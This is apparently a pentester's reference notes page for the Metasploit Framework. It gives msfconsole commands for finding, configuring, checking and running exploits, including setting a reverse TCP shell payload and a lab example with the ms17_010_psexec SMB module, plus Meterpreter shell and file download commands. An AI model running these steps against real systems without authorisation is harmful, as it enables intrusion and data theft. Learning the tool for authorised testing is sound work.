---
id: Metasploit
aliases: ["msfconsole"]
tags:
  - Pentest/Tools/Metasploit/Metasploit
---

# Metasploit

[Metasploit](https://www.metasploit.com/) â€” Metasploit Framework

___

<!-- Install & Update {{{-->
## Install & Update

Install Metasploit

```sh
sudo apt update && sudo apt install metasploit-framework
```

___
<!-- }}} -->

<!-- Engagement Structure {{{-->
## Engagement Structure

The MSF engagement structure can be divided into five main categories

- Enumeration
- Preparation
- Exploitation
- Privilege Escalation
- Post-Exploitation

<!-- Info {{{-->
> [!info]-
>
> ![[engagement-structure.png]]
<!-- }}} -->

___
<!-- }}} -->

<!-- Usage {{{-->
## Usage

<!-- Launch Metasploit {{{-->
### Launch Metasploit

Launch the Metasploit Framework

```sh
msfconsole
```

<!-- }}} -->

<!-- Search Exploit {{{-->
### Search Exploit

Search for exploits, modules, and scanners

```sh
search <exploit>
```

Filter the findings

```sh
search type:<type> name:<name>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> search type:auxiliary name:mssql
> ```
> ```sh
> search type:auxiliary scanner mssql
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Select Exploit {{{-->
### Select Exploit

Select the exploits, modules, and scanners

```sh
use <exploit_id>
```

```sh
use <exploit_name>
```

<!-- }}} -->

<!-- Show Actions {{{-->
### Show Actions

```sh
show actions
```

<!-- }}} -->

<!-- Set Actions {{{-->
### Set Actions

```sh
set ACTION <action_name>
```

<!-- }}} -->

<!-- Show Options {{{-->
### Show Options

Any option with `Required` set to `yes` needs to be set

```sh
show options
```

Show advanced options

```sh
show advanced
```

<!-- }}} -->

<!-- Set Options {{{-->
### Set Options

Set **Local Host** (IP, or the name of a network interface)

```sh
set LHOST <local_host>
```

Set **Remote Host** (IP, multiple IPs, or a file containing a list of IPs)

```sh
set RHOST <remote_host>
```

Set **payload** (*optional*)

```sh
set payload generic/shell_reverse_tcp
```

> [!example]-
>
> ```sh
> msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
> RHOSTS => 10.10.10.40
> msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
> LHOST => tun0
> ```

<!-- }}} -->

<!-- Check Exploit {{{-->
### Check Exploit

Check if the target is vulnerable to the exploit

```sh
check
```

> [!warning]
>
> Not every exploit supports the `check` function

<!-- }}} -->

<!-- Run Exploit {{{-->
### Run Exploit

Launch the exploit/scanner with the `run` or `exploit` commands

```sh
run
```

```sh
exploit
```

<!-- }}} -->

___

<!-- }}} -->

<!-- Meterpreter {{{-->
# Meterpreter

## Usage

Synopsis

```sh
meterpreter > help
```

Help

```sh
help
```

Spawn a shell

```sh
shell
```

<!-- Options {{{-->
## Options

- cd
- ls
- pwd
- download <file>

<!-- }}} -->

___

<!-- }}} -->
